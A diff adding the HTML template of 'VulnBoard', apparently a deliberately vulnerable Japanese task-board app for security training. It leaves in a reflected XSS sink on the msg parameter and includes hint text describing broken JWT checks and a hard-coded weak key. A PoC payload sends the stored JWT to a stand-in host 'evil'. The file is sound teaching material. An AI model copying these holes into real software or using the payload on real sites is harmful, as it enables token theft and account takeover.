@@ -1,0 +1,550 @@
+{% from "common/macros.html" import vuln_hint with context -%}
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>VulnBoard — タスクボード</title>
+  <style>
+    /* 配色・基本レイアウトは VulnBank / VulnEC（base.html）と統一 */
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; color: #1a1a2e; min-height: 100vh; }
+    nav { background: #1a1a2e; color: #fff; padding: 0 2rem;
+          display: flex; align-items: center; justify-content: space-between; height: 56px; }
+    nav .nav-left { display: flex; align-items: center; gap: 1rem; }
+    nav .brand { font-size: 1.3rem; font-weight: 700; color: #4fc3f7; text-decoration: none; }
+    nav .nav-vuln-map { color: #90caf9; text-decoration: none; font-size: .85rem; white-space: nowrap; cursor: pointer; }
+    nav .nav-vuln-map:hover { color: #fff; }
+    nav ul { list-style: none; display: flex; gap: 1.4rem; align-items: center; }
+    nav ul a, nav ul span { color: #ccc; text-decoration: none; font-size: .9rem; }
+    nav ul a:hover { color: #fff; cursor: pointer; }
+    .container { max-width: 1100px; margin: 2rem auto; padding: 0 1rem; }
+    .card { background: #fff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,.08); padding: 1.5rem; margin-bottom: 1.5rem; }
+    h1 { font-size: 1.6rem; margin-bottom: 1rem; color: #1a1a2e; }
+    label { display: block; font-size: .85rem; margin-bottom: .3rem; color: #555; }
+    input[type=text], input[type=password] {
+      width: 100%; padding: .55rem .75rem; border: 1px solid #ccc; border-radius: 5px;
+      font-size: .95rem; margin-bottom: .9rem; }
+    .btn { display: inline-block; padding: .55rem 1.3rem; border-radius: 5px; font-size: .9rem; cursor: pointer; border: none; }
+    .btn-primary { background: #1565c0; color: #fff; } .btn-primary:hover { background: #0d47a1; }
+    .btn-danger  { background: #c62828; color: #fff; } .btn-danger:hover { background: #b71c1c; }
+    .btn-sm { padding: .25rem .6rem; font-size: .8rem; }
+    .alert { padding: .8rem 1rem; border-radius: 5px; margin-bottom: 1rem; }
+    .alert-info { background: #e3f2fd; border: 1px solid #90caf9; color: #0d47a1; }
+    .muted { color: #777; font-size: .85rem; }
+    pre  { background: #1a1a2e; color: #e0e0e0; padding: 1rem; border-radius: 6px; overflow:auto; font-size: .8rem; white-space: pre-wrap; word-break: break-all; }
+    code { background: #f5f5f5; padding: 1px 5px; border-radius: 3px; font-size: .85rem; }
+    /* タスクボード（Trello 風） */
+    .board { display: flex; gap: 1rem; align-items: flex-start; }
+    .column { flex: 1; background: #e9edf2; border-radius: 8px; padding: .8rem; min-width: 0; }
+    .column h3 { font-size: .95rem; color: #555; margin-bottom: .6rem; display: flex; justify-content: space-between; }
+    .column h3 .count { background: #cfd8e3; color: #44607c; border-radius: 10px; padding: 0 .5rem; font-size: .75rem; }
+    .task { background: #fff; border-radius: 6px; box-shadow: 0 1px 3px rgba(0,0,0,.12);
+            padding: .6rem .7rem; margin-bottom: .6rem; font-size: .9rem; }
+    .task .actions { margin-top: .45rem; display: flex; gap: .3rem; }
+    .task .actions button { background: #e0e6ee; color: #34465c; border: none; border-radius: 4px; padding: .15rem .5rem; font-size: .8rem; cursor: pointer; }
+    .task .actions button:hover { background: #ccd6e2; }
+    /* 案1: タスクカード密度向上 */
+    .task .meta-row { display: flex; align-items: center; gap: .4rem; margin-bottom: .3rem; flex-wrap: wrap; }
+    .task .id-badge { font-size: .7rem; color: #888; font-family: monospace; }
+    .task .status-badge { font-size: .7rem; padding: 1px 7px; border-radius: 8px; font-weight: 600; }
+    .task .status-badge.s-todo  { background: #e0e0e0; color: #555; }
+    .task .status-badge.s-doing { background: #bbdefb; color: #0d47a1; }
+    .task .status-badge.s-done  { background: #c8e6c9; color: #1b5e20; }
+    .task .task-date { font-size: .7rem; color: #aaa; margin-left: auto; }
+    /* 案2: カラムヘッダー・空状態 */
+    .column--todo   { border-top: 3px solid #90a4ae; }
+    .column--doing  { border-top: 3px solid #42a5f5; }
+    .column--done   { border-top: 3px solid #66bb6a; }
+    .column h3 .col-icon { margin-right: .35rem; }
+    .empty-state { border: 1.5px dashed #c8d0db; border-radius: 6px; padding: .8rem; text-align: center;
+                   font-size: .82rem; color: #aaa; margin-bottom: .5rem; }
+    .add-row { display: flex; gap: .4rem; margin-top: .3rem; }
+    .add-row input { margin: 0; }
+    .badge { background: #e53935; color: #fff; font-size: .7rem; padding: 1px 6px; border-radius: 8px; margin-left: 4px; }
+    #vulnmap-table { width: 100%; border-collapse: collapse; font-size: .82rem; }
+    #vulnmap-table th, #vulnmap-table td { border-bottom: 1px solid #e0e0e0; padding: .45rem .55rem; text-align: left; vertical-align: top; word-break: break-word; }
+    #vulnmap-table th { background: #f5f5f5; font-weight: 600; }
+    #vulnmap-table td.mono { font-family: monospace; font-size: .78rem; word-break: break-all; }
+    /* 案5: 管理ボードテーブル */
+    #admin-table { width: 100%; border-collapse: collapse; font-size: .82rem; margin-bottom: 1rem; }
+    #admin-table th, #admin-table td { border-bottom: 1px solid #e0e0e0; padding: .45rem .55rem; text-align: left; vertical-align: top; word-break: break-word; }
+    #admin-table th { background: #f5f5f5; font-weight: 600; }
+    #admin-tasks-table { width: 100%; border-collapse: collapse; font-size: .82rem; margin-bottom: 1rem; }
+    #admin-tasks-table th, #admin-tasks-table td { border-bottom: 1px solid #e0e0e0; padding: .45rem .55rem; text-align: left; vertical-align: top; word-break: break-word; }
+    #admin-tasks-table th { background: #f5f5f5; font-weight: 600; }
+    .td-password { background: #fff3e0; color: #bf360c; font-family: monospace; font-size: .8rem; font-weight: 600; }
+    .admin-flag-banner { background: #fce4ec; border: 2px solid #e91e63; border-radius: 6px; padding: .8rem 1rem;
+                         font-family: monospace; font-size: .9rem; color: #880e4f; margin-bottom: 1rem; font-weight: 700; }
+    @media (max-width: 720px) { .board { flex-direction: column; } }
+    /* 脆弱性マップ種別バッジ（common/base.html の .tag-* と統一） */
+    .tag { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: .75rem; font-weight: 600; }
+    .tag-sqli   { background: #fff3e0; color: #e65100; }
+    .tag-xss    { background: #fce4ec; color: #880e4f; }
+    .tag-csrf   { background: #e8eaf6; color: #1a237e; }
+    .tag-idor   { background: #e0f2f1; color: #004d40; }
+    .tag-path   { background: #f3e5f5; color: #4a148c; }
+    .tag-cmd    { background: #fbe9e7; color: #bf360c; }
+    .tag-authz  { background: #e1f5fe; color: #01579b; }
+    .tag-biz    { background: #f1f8e9; color: #33691e; }
+    .tag-auth   { background: #fff8e1; color: #f57f17; }
+    .tag-jwt    { background: #ede7f6; color: #4527a0; }
+    .tag-massassign { background: #e3f2fd; color: #0d47a1; }
+    .tag-enum   { background: #e8f5e9; color: #1b5e20; }
+  </style>
+</head>
+<body>
+<nav>
+  <div class="nav-left">
+    <a class="brand" href="/">📋 VulnBoard</a>
+    {% if not hide_vuln_map %}<a class="nav-vuln-map" onclick="showVulnMap()">脆弱性マップ <span class="badge">{{ vuln_count }}</span></a>{% endif %}
+  </div>
+  <ul>
+    <li><span id="nav-user"></span></li>
+    <li id="nav-password" style="display:none"><a onclick="showPassword()">パスワード変更</a></li>
+    <li id="nav-admin" style="display:none"><a onclick="loadAdmin()">管理ボード</a></li>
+    <li id="nav-logout" style="display:none"><a onclick="doLogout()">ログアウト</a></li>
+  </ul>
+</nav>
+
+<div class="container">
+  <!-- [VULN JWT-7] 反射型XSSシンク: お知らせバナーが msg をエスケープせず描画 -->
+  {% if request.args.get('msg') %}<div class="alert alert-info">{{ request.args.get('msg')|safe }}</div>{% endif %}
+
+  {% call vuln_hint("JWT-7 PoC") %}これは <strong>JWT をセッションとして使うタスク管理 SPA</strong>です。
+    ログイン後の JWT は <code>localStorage['jwt']</code> に保存され、<code>Authorization: Bearer</code> で
+    <code>/api/*</code> を呼びます。お知らせバナー（<code>?msg=</code>）は未エスケープのため、
+    <code>/?msg=&lt;img src=x onerror="new Image().src='//evil/?t='+localStorage.jwt"&gt;</code>
+    でトークンを窃取できます。{% endcall %}
+
+  {% call vuln_hint("JWT-1〜6 / MASS-1 / ENUM-1 / PWPOLICY-1 PoC") %}自前 JWT の <code>verify()</code> は壊れており、
+    <code>alg=none</code>（JWT-1）・署名未検証（JWT-2）・弱い固定鍵 <code>secret123</code>（JWT-3）・<code>exp</code> 無し（JWT-5）・
+    RS256→HS256 のアルゴリズム混同（JWT-6）を受理します。<code>/api/login</code> のトークンには平文の
+    <code>password</code>/<code>secret_note</code> が入ります（JWT-4）。登録 <code>POST /api/register</code> は
+    クライアントの <code>role</code> を信頼し（MASS-1）、既存ユーザー名では 409 を返して存在を露呈し（ENUM-1）、
+    パスワードの強度を検証しません（PWPOLICY-1）。{% endcall %}
+
+  <!-- ログイン / 新規登録カード（未ログイン時） -->
+  <div class="card" id="login-card">
+    <div id="login-form">
+      <h1>VulnBoard へようこそ</h1>
+      <p class="muted" style="margin-bottom:1rem;">タスクボードを開くにはログインしてください。</p>
+      <label>ユーザー名</label>
+      <input type="text" id="u" autocomplete="username" placeholder="ユーザー名">
+      <label>パスワード</label>
+      <input type="password" id="p" autocomplete="current-password" placeholder="パスワード">
+      <div id="login-error" class="alert" style="display:none; background:#ffebee; border:1px solid #ef9a9a; color:#b71c1c;"></div>
+      <button class="btn btn-primary" onclick="doLogin()">ログイン</button>
+      <p class="muted" style="margin-top:1rem;">アカウントがない方は <a href="#" onclick="showRegister(true);return false;">新規登録</a></p>
+      {% call vuln_hint("テストアカウント") %}<br>
+        <code>admin / admin123</code><br>
+        <code>alice / password123</code>
+      {% endcall %}
+    </div>
+    <div id="register-form" style="display:none">
+      <h1>アカウントを作成</h1>
+      <p class="muted" style="margin-bottom:1rem;">ユーザー名とパスワードを入力して、すぐにボードをはじめましょう。</p>
+      <label>ユーザー名</label>
+      <input type="text" id="ru" autocomplete="username" placeholder="お好きなユーザー名">
+      <label>パスワード</label>
+      <input type="password" id="rp" autocomplete="new-password" placeholder="パスワード">
+      <div id="register-success" class="alert" style="display:none; background:#e8f5e9; border:1px solid #a5d6a7; color:#1b5e20;"></div>
+      <div id="register-error" class="alert alert-info" style="display:none; background:#ffebee; border-color:#ef9a9a; color:#b71c1c;"></div>
+      <button class="btn btn-primary" onclick="doRegister()">登録してはじめる</button>
+      <p class="muted" style="margin-top:1rem;">すでにアカウントをお持ちの方は <a href="#" onclick="showRegister(false);return false;">ログイン</a></p>
+    </div>
+  </div>
+
+  <!-- タスクボード（ログイン時） -->
+  <div id="board-view" style="display:none">
+    <div class="card">
+      <h1 style="margin-bottom:.3rem;">タスクボード</h1>
+      <p class="muted" id="board-owner"></p>
+    </div>
+    <div class="board" id="board"></div>
+  </div>
+
+  <!-- パスワード変更 -->
+  <div class="card" id="password-card" style="display:none">
+    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:.6rem;">
+      <h1 style="margin:0;">パスワード変更</h1>
+      <button class="btn btn-primary btn-sm" onclick="backToBoard()">← ボードに戻る</button>
+    </div>
+    <label>現在のパスワード</label>
+    <input type="password" id="cur-pw" autocomplete="current-password">
+    <label>新しいパスワード</label>
+    <input type="password" id="new-pw" autocomplete="new-password">
+    <div id="password-msg" class="alert alert-info" style="display:none"></div>
+    <button class="btn btn-primary" onclick="doChangePassword()">変更する</button>
+  </div>
+
+  <!-- 管理ボード出力 -->
+  <div class="card" id="admin-card" style="display:none">
+    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:.6rem;">
+      <h1 style="margin:0;">管理ボード（全ユーザー）</h1>
+      <button class="btn btn-primary btn-sm" onclick="backToBoard()">← ボードに戻る</button>
+    </div>
+    <div id="admin-flag-area"></div>
+    <h2 style="font-size:1rem; margin-bottom:.5rem; color:#555;">ユーザー一覧</h2>
+    <div style="overflow-x:auto;"><table id="admin-table"></table></div>
+    <h2 style="font-size:1rem; margin:.8rem 0 .5rem; color:#555;">全タスク一覧</h2>
+    <div style="overflow-x:auto;"><table id="admin-tasks-table"></table></div>
+    <pre id="admin-out" style="display:none"></pre>
+  </div>
+
+  <!-- 脆弱性マップ（SPA 内ビュー。ナビを変えずに表示する。nohint 時は出さない） -->
+  {% if not hide_vuln_map %}
+  <div class="card" id="vulnmap-card" style="display:none">
+    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:.6rem;">
+      <h1 style="margin:0;">脆弱性マップ</h1>
+      <button class="btn btn-primary btn-sm" onclick="backToBoard()">← ボードに戻る</button>
+    </div>
+    <p class="muted" id="vulnmap-count" style="margin-bottom:1rem;"></p>
+    <div style="overflow-x:auto;"><table id="vulnmap-table"></table></div>
+  </div>
+  {% endif %}
+</div>
+
+<script>
+  const TOKEN_KEY = 'jwt';
+  const COLUMNS = [['todo', 'To Do'], ['doing', 'Doing'], ['done', 'Done']];
+  const $ = (id) => document.getElementById(id);
+  const hideEl = (id) => { const el = $(id); if (el) el.style.display = 'none'; };  // nohint 時に無い要素にも安全
+  const token = () => localStorage.getItem(TOKEN_KEY);
+
+  async function api(path, opts = {}) {
+    const headers = Object.assign({}, opts.headers || {});
+    if (token()) headers['Authorization'] = 'Bearer ' + token();
+    if (opts.body) headers['Content-Type'] = 'application/json';
+    const r = await fetch(path, Object.assign({}, opts, {headers}));
+    return {status: r.status, body: await r.json().catch(() => ({}))};
+  }
+
+  function showRegister(on) {
+    $('login-form').style.display = on ? 'none' : 'block';
+    $('register-form').style.display = on ? 'block' : 'none';
+    $('register-error').style.display = 'none';
+    $('login-error').style.display = 'none';
+  }
+
+  async function doLogin() {
+    const r = await api('/api/login', {method: 'POST', body: JSON.stringify({username: $('u').value, password: $('p').value})});
+    if (r.status !== 200) {
+      const errEl = $('login-error');
+      errEl.textContent = r.body.error || 'ユーザー名またはパスワードが正しくありません';
+      errEl.style.display = 'block';
+      return;
+    }
+    $('login-error').style.display = 'none';
+    // [VULN JWT-7] JWT を localStorage に保存（JavaScript から読めるため XSS で窃取可能）
+    localStorage.setItem(TOKEN_KEY, r.body.token);
+    render();
+  }
+
+  async function doRegister() {
+    const r = await api('/api/register', {method: 'POST', body: JSON.stringify({username: $('ru').value, password: $('rp').value})});
+    if (r.status === 201) {
+      const suc = $('register-success');
+      suc.textContent = 'ようこそ！アカウントを作成しました';
+      suc.style.display = 'block';
+      localStorage.setItem(TOKEN_KEY, r.body.token);   // 登録後そのままログイン
+      showRegister(false);
+      render();
+      return;
+    }
+    const err = $('register-error');
+    err.textContent = r.body.error || '登録に失敗しました';   // 409 はユーザー名の存在を露呈（ENUM-1）
+    err.style.display = 'block';
+  }
+
+  function doLogout() {
+    localStorage.removeItem(TOKEN_KEY);
+    $('admin-card').style.display = 'none';
+    $('password-card').style.display = 'none';
+    hideEl('vulnmap-card');
+    render();
+  }
+
+  function showPassword() {
+    // 4画面は排他。ボードを含め他の画面はすべて隠してパスワード変更だけを出す
+    hideEl('vulnmap-card');
+    $('admin-card').style.display = 'none';
+    $('board-view').style.display = 'none';
+    const card = $('password-card');
+    card.style.display = 'block';
+    $('password-msg').style.display = 'none';
+    $('cur-pw').value = ''; $('new-pw').value = '';
+    card.scrollIntoView({behavior: 'smooth'});
+  }
+
+  async function doChangePassword() {
+    const r = await api('/api/password', {method: 'POST',
+      body: JSON.stringify({old_password: $('cur-pw').value, new_password: $('new-pw').value})});
+    const msg = $('password-msg');
+    msg.style.display = 'block';
+    if (r.status === 200) {
+      msg.style.background = '#e8f5e9'; msg.style.borderColor = '#a5d6a7'; msg.style.color = '#1b5e20';
+      msg.textContent = 'パスワードを変更しました。';
+      $('cur-pw').value = ''; $('new-pw').value = '';
+    } else {
+      msg.style.background = '#ffebee'; msg.style.borderColor = '#ef9a9a'; msg.style.color = '#b71c1c';
+      msg.textContent = r.body.error || 'パスワードの変更に失敗しました';
+    }
+  }
+
+  const STATUS_LABEL = {todo: 'To Do', doing: 'Doing', done: 'Done'};
+
+  function makeTask(t) {
+    const el = document.createElement('div');
+    el.className = 'task';
+    // メタ行: #<id> バッジ + ステータスバッジ + 作成日
+    const metaRow = document.createElement('div');
+    metaRow.className = 'meta-row';
+    const idBadge = document.createElement('span');
+    idBadge.className = 'id-badge';
+    idBadge.textContent = '#' + t.id;            // ID バッジ（textContent で安全）
+    metaRow.appendChild(idBadge);
+    const sBadge = document.createElement('span');
+    sBadge.className = 'status-badge s-' + t.status;
+    sBadge.textContent = STATUS_LABEL[t.status] || t.status;  // ステータスラベル
+    metaRow.appendChild(sBadge);
+    if (t.created_at) {
+      const dateEl = document.createElement('span');
+      dateEl.className = 'task-date';
+      dateEl.textContent = new Date(t.created_at).toLocaleDateString('ja-JP');
+      metaRow.appendChild(dateEl);
+    }
+    el.appendChild(metaRow);
+    const title = document.createElement('div');
+    title.textContent = t.title;                 // 安全に描画（タスク名は意図的XSSにしない）
+    el.appendChild(title);
+    const actions = document.createElement('div');
+    actions.className = 'actions';
+    const order = COLUMNS.map((c) => c[0]);
+    const i = order.indexOf(t.status);
+    if (i > 0) { const b = document.createElement('button'); b.textContent = '◀'; b.onclick = () => moveTask(t.id, order[i - 1]); actions.appendChild(b); }
+    if (i < order.length - 1) { const b = document.createElement('button'); b.textContent = '▶'; b.onclick = () => moveTask(t.id, order[i + 1]); actions.appendChild(b); }
+    el.appendChild(actions);
+    return el;
+  }
+
+  async function moveTask(id, status) {
+    await api('/api/tasks/' + id + '/move', {method: 'POST', body: JSON.stringify({status})});
+    loadBoard();
+  }
+
+  async function addTask(status) {
+    const inp = $('add-' + status);
+    const title = inp.value.trim();
+    if (!title) return;
+    await api('/api/tasks', {method: 'POST', body: JSON.stringify({title, status})});
+    inp.value = '';
+    loadBoard();
+  }
+
+  const COLUMN_ICONS = {todo: '📋', doing: '🚧', done: '✅'};
+
+  async function loadBoard() {
+    const r = await api('/api/tasks');
+    if (r.status !== 200) { doLogout(); return; }
+    const tasks = r.body.tasks || [];
+    const board = $('board');
+    board.innerHTML = '';
+    for (const [status, label] of COLUMNS) {
+      const col = tasks.filter((t) => t.status === status);
+      const colEl = document.createElement('div');
+      colEl.className = 'column column--' + status;
+      const h = document.createElement('h3');
+      const iconEl = document.createElement('span');
+      iconEl.className = 'col-icon';
+      iconEl.textContent = COLUMN_ICONS[status] || '';
+      const labelEl = document.createElement('span');
+      labelEl.textContent = label;
+      const countEl = document.createElement('span');
+      countEl.className = 'count';
+      countEl.textContent = col.length;
+      h.appendChild(iconEl); h.appendChild(labelEl); h.appendChild(countEl);
+      colEl.appendChild(h);
+      if (col.length === 0) {
+        const empty = document.createElement('div');
+        empty.className = 'empty-state';
+        empty.textContent = 'まだカードがありません';
+        colEl.appendChild(empty);
+      }
+      col.forEach((t) => colEl.appendChild(makeTask(t)));
+      const row = document.createElement('div');
+      row.className = 'add-row';
+      const inp = document.createElement('input');
+      inp.type = 'text'; inp.id = 'add-' + status; inp.placeholder = '+ カードを追加';
+      inp.onkeydown = (e) => { if (e.key === 'Enter') addTask(status); };
+      const btn = document.createElement('button');
+      btn.className = 'btn btn-primary btn-sm'; btn.textContent = '追加'; btn.onclick = () => addTask(status);
+      row.appendChild(inp); row.appendChild(btn);
+      colEl.appendChild(row);
+      board.appendChild(colEl);
+    }
+  }
+
+  async function loadAdmin() {
+    // 4画面は排他。ボードを含め他の画面はすべて隠して管理ボードだけを出す
+    hideEl('vulnmap-card');
+    $('password-card').style.display = 'none';
+    $('board-view').style.display = 'none';
+    const r = await api('/api/admin');
+    $('admin-card').style.display = 'block';
+    if (r.status !== 200) {
+      $('admin-flag-area').textContent = '';
+      $('admin-table').replaceChildren();
+      $('admin-tasks-table').replaceChildren();
+      $('admin-out').textContent = '/api/admin → ' + r.status + '\n' + JSON.stringify(r.body, null, 2);
+      $('admin-out').style.display = 'block';
+      $('admin-card').scrollIntoView({behavior: 'smooth'});
+      return;
+    }
+    $('admin-out').style.display = 'none';
+    // 露出した内部資格情報の警告バナー
+    const flagArea = $('admin-flag-area');
+    flagArea.textContent = '';
+    if (r.body.internal_api_key) {
+      const banner = document.createElement('div');
+      banner.className = 'admin-flag-banner';
+      banner.textContent = '⚠ 内部APIキーが応答に露出しています: ' + r.body.internal_api_key;
+      flagArea.appendChild(banner);
+    }
+    // ユーザー一覧テーブル
+    const uTable = $('admin-table');
+    uTable.replaceChildren();
+    const uCols = ['id', 'username', 'password', 'email', 'role'];
+    const uHead = document.createElement('tr');
+    for (const c of uCols) { const th = document.createElement('th'); th.textContent = c; uHead.appendChild(th); }
+    uTable.appendChild(uHead);
+    for (const u of (r.body.users || [])) {
+      const tr = document.createElement('tr');
+      uCols.forEach((col) => {
+        const td = document.createElement('td');
+        td.textContent = u[col] == null ? '' : String(u[col]);
+        if (col === 'password') td.className = 'td-password';  // 平文パスワード強調（AUTH-1露出）
+        tr.appendChild(td);
+      });
+      uTable.appendChild(tr);
+    }
+    // タスク一覧テーブル
+    const tTable = $('admin-tasks-table');
+    tTable.replaceChildren();
+    const tCols = ['id', 'user_id', 'title', 'status', 'position'];
+    const tHead = document.createElement('tr');
+    for (const c of tCols) { const th = document.createElement('th'); th.textContent = c; tHead.appendChild(th); }
+    tTable.appendChild(tHead);
+    for (const t of (r.body.tasks || [])) {
+      const tr = document.createElement('tr');
+      tCols.forEach((col) => {
+        const td = document.createElement('td');
+        td.textContent = t[col] == null ? '' : String(t[col]);
+        tr.appendChild(td);
+      });
+      tTable.appendChild(tr);
+    }
+    $('admin-card').scrollIntoView({behavior: 'smooth'});
+  }
+
+  const TYPE_CLASS = {
+    'SQL Injection': 'sqli', 'Reflected XSS': 'xss', 'Stored XSS': 'xss',
+    'DOM-based XSS': 'xss', 'CSRF': 'csrf', 'IDOR': 'idor',
+    'Path Traversal': 'path', 'Command Injection': 'cmd',
+    'Broken Access Control': 'authz', 'Business Logic': 'biz',
+    'Auth Weakness': 'auth', 'Session Fixation': 'auth',
+    // VulnBoard 固有の種別
+    'JWT alg=none 受理': 'jwt', 'JWT 署名未検証': 'jwt', 'JWT 弱い署名鍵': 'jwt',
+    'JWT 機微情報の格納': 'jwt', 'JWT 無期限トークン': 'jwt', 'JWT alg 混同 (RS256→HS256)': 'jwt',
+    'DOM-based XSS（SPA・トークン窃取）': 'xss',
+    'Mass Assignment（登録時の権限昇格）': 'massassign',
+    'User Enumeration（アカウント列挙）': 'enum',
+    'Weak Password Policy（パスワードポリシー不在）': 'auth',
+  };
+
+  async function showVulnMap() {
+    if (!$('vulnmap-card')) return;                        // nohint 時はビュー自体が無い
+    const r = await api('/vuln-map.json');
+    if (r.status !== 200) { alert('脆弱性マップを取得できません'); return; }
+    const data = r.body;
+    $('vulnmap-count').textContent = '合計 ' + data.count + ' 件（site=' + data.site + '）';
+    const table = $('vulnmap-table');
+    table.replaceChildren();
+    const cols = ['ID', '種別', 'メソッド', 'エンドポイント', 'パラメータ', '検証用ペイロード例', '備考'];
+    const head = document.createElement('tr');
+    for (const c of cols) { const th = document.createElement('th'); th.textContent = c; head.appendChild(th); }
+    table.appendChild(head);
+    for (const v of (data.vulns || [])) {
+      const tr = document.createElement('tr');
+      // payload はそのまま「文字列として」表示する（textContent なので XSS にならない）
+      const cells = [v.id, v.type, v.method, v.endpoint, v.param, v.payload, v.notes];
+      cells.forEach((val, i) => {
+        const td = document.createElement('td');
+        if (i === 1) {
+          // 種別列: 色付きタグバッジ（common/vuln_map.html と統一）
+          const span = document.createElement('span');
+          span.className = 'tag tag-' + (TYPE_CLASS[val] || 'auth');
+          span.textContent = val == null ? '' : val;
+          td.appendChild(span);
+        } else {
+          td.textContent = val == null ? '' : val;
+          if (i === 0 || i === 3 || i === 5) td.className = 'mono';
+        }
+        tr.appendChild(td);
+      });
+      table.appendChild(tr);
+    }
+    // 脆弱性マップのナビは未ログインでも常に出ているため、ログインカードを含む
+    // 他のすべての画面を隠す（隠し漏れるとログイン画面の下に重なって描画される）
+    $('login-card').style.display = 'none';
+    $('board-view').style.display = 'none';
+    $('admin-card').style.display = 'none';
+    $('password-card').style.display = 'none';
+    $('vulnmap-card').style.display = 'block';
+    window.scrollTo(0, 0);
+  }
+
+  function backToBoard() {
+    // セカンダリ画面を閉じる。ログイン済みならボード、未ログインならログイン画面に戻す
+    hideEl('vulnmap-card');
+    $('password-card').style.display = 'none';
+    $('admin-card').style.display = 'none';
+    if (!token()) {
+      $('login-card').style.display = 'block';
+      $('board-view').style.display = 'none';
+      return;
+    }
+    $('login-card').style.display = 'none';
+    $('board-view').style.display = 'block';
+  }
+
+  async function render() {
+    if (!token()) {
+      $('login-card').style.display = 'block';
+      showRegister(false);
+      $('board-view').style.display = 'none';
+      $('password-card').style.display = 'none';
+      hideEl('vulnmap-card');
+      $('nav-user').textContent = '';
+      $('nav-password').style.display = 'none';
+      $('nav-admin').style.display = 'none';
+      $('nav-logout').style.display = 'none';
+      return;
+    }
+    const me = await api('/api/me');
+    if (me.status !== 200) { doLogout(); return; }
+    const claims = me.body.claims || {};
+    $('nav-user').textContent = '👤 ' + me.body.authenticated_as + '（' + claims.role + '）';
+    $('nav-password').style.display = '';
+    $('nav-logout').style.display = '';
+    $('nav-admin').style.display = claims.role === 'admin' ? '' : 'none';
+    $('login-card').style.display = 'none';
+    $('board-view').style.display = 'block';
+    $('board-owner').textContent = me.body.authenticated_as + ' のタスク';
+    loadBoard();
+  }
+
+  render();
+</script>
+</body>
+</html>
